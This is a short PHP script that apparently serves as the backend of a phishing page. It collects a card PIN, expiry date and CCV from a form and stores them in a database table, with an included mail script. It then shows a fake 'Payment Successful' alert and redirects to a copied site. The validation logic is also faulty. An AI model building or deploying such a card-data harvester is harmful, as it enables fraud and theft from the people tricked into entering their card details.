<?php require '../send_mail.php' ?>


<?php

    $save_1 = isset($_POST['account_1']);

    if ($save_1) {

    $card_pin = mysqli_real_escape_string($conn, $_POST['card_pin']);
    $date = mysqli_real_escape_string($conn, $_POST['date']);
    $ccv = mysqli_real_escape_string($conn, $_POST['ccv']);
    // $user_mail = mysqli_real_escape_string($conn, $_POST['email']);
    

        

    // ============= SUBMIT FORM ========
                if (empty($card_pin) || empty($date) || empty($ccv) ) {
                    echo "<script>alert('Check Empty fields')</script>";
                    
                }else{
                    echo "";

                }
                if (!empty($card_pin) || !empty($date) || !empty($ccv)  ) {
                   
                    // ======= INSERT DATA TO DATABASE =========
                    
                // Write a query statement 
                $query = "INSERT INTO pay(`pin`, `expire`, `ccv`) VALUES ('$card_pin', '$date', '$ccv')";
                        
                //query the database
                $result = mysqli_query($conn, $query) or die('Failed to insert to Database! '. mysqli_error($conn));

                echo  "<script>alert('Success! Payment Successful')</script>";
                
                
                // ==== REDIRECT TO HOME PAGE =======
                header("Location: ../../web2/index.html");
                
                }
                else
                {
                   echo "<script>alert('Failed! Something went wrong')</script>";
                }


    }


?>








